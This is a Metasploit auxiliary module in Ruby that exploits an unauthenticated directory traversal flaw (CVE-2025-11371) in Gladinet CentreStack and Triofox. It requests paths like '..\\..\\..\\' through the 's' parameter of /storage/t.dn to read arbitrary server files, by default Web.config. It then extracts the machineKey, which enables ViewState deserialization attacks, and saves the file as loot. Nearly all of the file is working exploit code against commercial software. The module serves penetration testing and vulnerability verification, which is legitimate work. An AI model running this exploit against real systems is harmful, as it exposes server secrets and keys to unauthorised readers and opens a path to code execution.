##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::Gladinet
  prepend Msf::Exploit::Remote::AutoCheck

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Gladinet CentreStack/Triofox Local File Inclusion',
        'Description' => %q{
          This module exploits a local file inclusion vulnerability (CVE-2025-11371) in
          Gladinet CentreStack and Triofox that allows an unauthenticated attacker to read
          arbitrary files from the server's file system.

          The vulnerability exists in the `/storage/t.dn` endpoint which does not properly
          sanitize the `s` parameter, allowing directory traversal attacks. This can be used
          to read sensitive files such as Web.config which contains the machineKey used for
          ViewState deserialization attacks (CVE-2025-30406).

          Gladinet CentreStack versions up to 16.10.10408.56683 are vulnerable.
          Gladinet Triofox versions up to 16.10.10408.56683 are vulnerable.
        },
        'Author' => [
          'Huntress Team', # Vulnerability discovery
          'Valentin Lobstein <chocapikk[at]leakix.net>' # Metasploit module
        ],
        'License' => MSF_LICENSE,
        'References' => [
          ['CVE', '2025-11371'],
          ['URL', 'https://www.huntress.com/blog/cve-2025-30406-critical-gladinet-centrestack-triofox-vulnerability-exploited-in-the-wild']
        ],
        'DisclosureDate' => '2025-04-03',
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'SideEffects' => [IOC_IN_LOGS],
          'Reliability' => []
        }
      )
    )

    register_options([
      OptString.new('TARGETURI', [true, 'The base path to the Gladinet CentreStack or Triofox application', '/']),
      OptString.new('FILEPATH', [true, 'The file to read on the target', DEFAULT_WEB_CONFIG_PATH]),
      OptBool.new('EXTRACT_MACHINEKEY', [true, 'Extract machineKey from Web.config if found', true])
    ])
  end

  def valid_response?(response)
    response&.code == 200
  end

  def build_lfi_path(file_path)
    # Remove C:\ prefix if present (LFI doesn't work with drive letters)
    normalized_path = file_path.gsub(/^[A-Z]:\\/, '').gsub(/^[A-Z]:/, '')
    "..\\..\\..\\#{normalized_path.gsub(' ', '+')}"
  end

  def send_lfi_request(file_path)
    # Build URL manually to avoid encoding issues (server expects raw + and parentheses)
    lfi_path = build_lfi_path(file_path)
    uri = normalize_uri(target_uri.path, 'storage', 't.dn')
    uri += "?s=#{lfi_path}&sid=1"

    send_request_cgi({
      'method' => 'GET',
      'uri' => uri,
      'encode_params' => false
    })
  end

  def check
    version = gladinet_version
    return Exploit::CheckCode::Detected('Gladinet detected but version could not be determined') if version.nil?

    rex_version = Rex::Version.new(version)
    lfi_vulnerable = rex_version <= Rex::Version.new('16.10.10408.56683')
    return Exploit::CheckCode::Vulnerable("LFI vulnerability confirmed (Build #{version})") if lfi_vulnerable

    Exploit::CheckCode::Detected("Version #{version} detected, attempting LFI anyway")
  end

  def read_file_via_lfi(file_path)
    print_status("Attempting to read file via LFI: #{file_path}")

    res = send_lfi_request(file_path)
    return nil unless valid_response?(res)

    res.body
  end

  def run
    file_content = read_file_via_lfi(datastore['FILEPATH'])
    return print_error('Failed to read file via LFI') if file_content.nil? || file_content.empty?

    print_good("Successfully read file: #{datastore['FILEPATH']}")
    print_line
    print_line(file_content)
    print_line

    fname = File.basename(datastore['FILEPATH'])
    path = store_loot(
      'gladinet.file',
      'text/plain',
      datastore['RHOST'],
      file_content,
      fname,
      'File read from Gladinet via LFI (CVE-2025-11371)'
    )
    print_good("File saved to: #{path}")

    return unless datastore['EXTRACT_MACHINEKEY']

    handle_machinekey_extraction(file_content, datastore['FILEPATH'], 'MachineKey extracted from Gladinet Web.config (CVE-2025-11371)')
  end
end
